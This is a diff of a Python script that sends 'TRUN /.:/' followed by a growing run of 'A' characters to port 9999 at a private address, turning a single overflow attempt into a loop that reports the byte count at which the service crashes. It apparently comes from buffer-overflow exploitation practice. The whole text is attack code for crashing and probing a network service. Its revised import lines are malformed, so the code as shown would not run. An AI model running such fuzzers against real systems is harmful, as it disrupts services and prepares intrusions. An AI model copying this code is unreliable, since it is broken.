@@ -1,13 +1,20 @@
-#!/usr/bin/python
-# -*- coding: utf-8 -*-
-#!/usr/bin/python
+#!/usr/bin/python 
 
-import sys, socket
+import sys, socket from time 
+import sleep 
 
-buffer = "\x41" * 3000
+buffer = "A" * 100 
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('10.0.0.71', 9999))
-s.send(('TRUN /.:/' + buffer))
-s.recv(1024)
-s.close()
+while True: 
+	try: 
+		payload = "TRUN /.:/" + buffer 
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+		s.connect(('192.168.1.35',9999)) 
+		print ("[+] Sending the payload...\n" + str(len(buffer))) 
+		s.send((payload.encode())) 
+		s.close() 
+		sleep(1) 
+		buffer = buffer + "A"*100 
+	except: 
+		print ("The fuzzing crashed at %s bytes" % str(len(buffer))) 
+		sys.exit()
